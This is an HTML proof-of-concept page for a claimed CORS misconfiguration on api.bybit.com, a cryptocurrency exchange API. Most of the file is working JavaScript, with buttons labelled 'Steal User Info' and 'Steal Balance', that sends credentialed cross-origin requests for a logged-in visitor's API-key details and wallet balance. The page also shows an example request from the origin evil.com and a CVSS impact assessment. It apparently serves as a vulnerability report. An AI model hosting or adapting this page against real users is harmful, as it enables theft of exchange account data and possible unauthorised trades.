<!DOCTYPE html>
<html>
<head>
    <title>Bybit CORS Vulnerability PoC</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #1a1a2e; color: #eee; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #e94560; }
        .warning { background: #e94560; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .result { background: #16213e; padding: 15px; border-radius: 5px; margin: 10px 0; font-family: monospace; white-space: pre-wrap; }
        button { background: #e94560; color: white; border: none; padding: 15px 30px; font-size: 16px; cursor: pointer; border-radius: 5px; margin: 5px; }
        button:hover { background: #ff6b6b; }
        .success { color: #00ff00; }
        .error { color: #ff6b6b; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üö® Bybit CORS Vulnerability PoC</h1>
        
        <div class="warning">
            <strong>VULNERABILITY:</strong> api.bybit.com reflects any Origin header with Access-Control-Allow-Credentials: true<br>
            <strong>IMPACT:</strong> Attacker can steal user data (balance, API keys, orders) from any logged-in Bybit user who visits malicious page
        </div>
        
        <h2>Attack Demonstration</h2>
        <p>If victim is logged into Bybit and visits this page, attacker can:</p>
        <ul>
            <li>Read account balance</li>
            <li>Read API key information</li>
            <li>Read order history</li>
            <li>Read deposit/withdrawal addresses</li>
        </ul>
        
        <button onclick="stealMarketData()">1. Test Public Endpoint</button>
        <button onclick="stealUserInfo()">2. Steal User Info (requires login)</button>
        <button onclick="stealBalance()">3. Steal Balance (requires login)</button>
        
        <h3>Results:</h3>
        <div id="results" class="result">Click a button to test...</div>
        
        <h2>Technical Details</h2>
        <div class="result">
GET /v5/market/time HTTP/1.1
Host: api.bybit.com
Origin: https://evil.com

Response Headers:
access-control-allow-origin: https://evil.com  ‚Üê REFLECTS ATTACKER ORIGIN
access-control-allow-credentials: true         ‚Üê ALLOWS COOKIES
access-control-expose-headers: token, X-Signature
        </div>
        
        <h2>Impact Assessment</h2>
        <div class="result">
CVSS 3.1 Score: 8.1 (High)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

- Attack Vector: Network (attacker hosts malicious page)
- Attack Complexity: Low (simple XHR request)
- Privileges Required: None
- User Interaction: Required (victim visits page)
- Scope: Unchanged
- Confidentiality: High (full account data exposure)
- Integrity: High (can potentially execute trades via CSRF)
- Availability: None
        </div>
    </div>
    
    <script>
    const API_BASE = 'https://api.bybit.com';
    
    function log(msg, isError = false) {
        const el = document.getElementById('results');
        const cls = isError ? 'error' : 'success';
        el.innerHTML += `<span class="${cls}">${new Date().toISOString()}: ${msg}</span>\n`;
    }
    
    async function stealMarketData() {
        log('Testing public endpoint...');
        try {
            const resp = await fetch(`${API_BASE}/v5/market/time`, {
                method: 'GET',
                credentials: 'include',  // Send cookies!
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            const data = await resp.json();
            log(`SUCCESS! Server time: ${JSON.stringify(data)}`);
            log('CORS allows cross-origin requests with credentials!');
        } catch (e) {
            log(`Error: ${e.message}`, true);
        }
    }
    
    async function stealUserInfo() {
        log('Attempting to steal user info...');
        log('NOTE: This requires victim to be logged into Bybit with session cookie');
        try {
            // Try session-based auth (if user is logged in via browser)
            const resp = await fetch(`${API_BASE}/v5/user/query-api`, {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            const data = await resp.json();
            if (data.retCode === 0) {
                log(`üö® CRITICAL! Stole user data: ${JSON.stringify(data.result)}`);
            } else {
                log(`Response (may need active session): ${JSON.stringify(data)}`);
            }
        } catch (e) {
            log(`Error: ${e.message}`, true);
        }
    }
    
    async function stealBalance() {
        log('Attempting to steal wallet balance...');
        try {
            const resp = await fetch(`${API_BASE}/v5/account/wallet-balance?accountType=UNIFIED`, {
                method: 'GET', 
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            const data = await resp.json();
            if (data.retCode === 0) {
                log(`üö® CRITICAL! Stole balance: ${JSON.stringify(data.result)}`);
            } else {
                log(`Response: ${JSON.stringify(data)}`);
            }
        } catch (e) {
            log(`Error: ${e.message}`, true);
        }
    }
    </script>
</body>
</html>
